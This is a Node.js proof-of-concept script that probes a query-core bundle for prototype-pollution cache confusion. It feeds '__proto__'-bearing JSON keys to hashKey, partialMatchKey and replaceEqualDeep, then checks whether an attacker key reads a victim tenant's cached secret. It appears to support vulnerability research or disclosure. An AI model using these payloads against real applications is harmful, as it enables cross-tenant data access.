#!/usr/bin/env node

const path = require('node:path')

async function main() {
  const modulePath = process.argv[2]

  if (!modulePath) {
    console.error(
      'Usage: node scripts/query-core-proto-cache-confusion-poc.cjs <query-core-bundle-path>',
    )
    process.exit(1)
  }

  const resolvedModulePath = path.resolve(modulePath)
  const api = require(resolvedModulePath)
  const { QueryClient, hashKey, partialMatchKey, replaceEqualDeep } = api

  if (
    !QueryClient ||
    !hashKey ||
    !partialMatchKey ||
    !replaceEqualDeep
  ) {
    throw new Error(
      `Expected QueryClient/hashKey/partialMatchKey/replaceEqualDeep exports from ${resolvedModulePath}`,
    )
  }

  const trustedKey = [{ tenant: 'victim', userId: 1 }]
  const attackerControlledKey = [
    JSON.parse('{"__proto__":{"admin":true},"tenant":"victim","userId":1}'),
  ]
  const partialMatchProbe = [JSON.parse('{"__proto__":{},"id":1}')]
  const structuralSharingProbe = JSON.parse(
    '{"__proto__":{"polluted":123},"safe":1}',
  )

  const hashComparison = {
    trustedKey: hashKey(trustedKey),
    attackerControlledKey: hashKey(attackerControlledKey),
  }

  const partialMatch = partialMatchKey([{ id: 1 }], partialMatchProbe)

  const structurallySharedResult = replaceEqualDeep({}, structuralSharingProbe)
  const structuralSharing = {
    keys: Object.keys(structurallySharedResult),
    hasOwnProto: Object.prototype.hasOwnProperty.call(
      structurallySharedResult,
      '__proto__',
    ),
    prototypePolluted:
      Object.getPrototypeOf(structurallySharedResult)?.polluted ?? null,
    ownProtoValue: structurallySharedResult['__proto__'],
  }

  const queryClient = new QueryClient()
  queryClient.setQueryData(trustedKey, 'secret')

  const directRead = queryClient.getQueryData(attackerControlledKey)
  let fetchCalls = 0
  const fetchResult = await queryClient.fetchQuery({
    queryKey: attackerControlledKey,
    queryFn: async () => {
      fetchCalls += 1
      return 'public'
    },
    staleTime: Infinity,
  })

  const cacheConfusion = {
    directRead,
    fetchResult,
    fetchCalls,
    trustedAfter: queryClient.getQueryData(trustedKey),
    attackerAfter: queryClient.getQueryData(attackerControlledKey),
    cacheEntries: queryClient.getQueryCache().getAll().length,
  }

  console.log(
    JSON.stringify(
      {
        bundle: resolvedModulePath,
        hashComparison: {
          ...hashComparison,
          collides:
            hashComparison.trustedKey ===
            hashComparison.attackerControlledKey,
        },
        partialMatch,
        structuralSharing,
        cacheConfusion,
      },
      null,
      2,
    ),
  )
}

main().catch((error) => {
  console.error(error)
  process.exit(1)
})
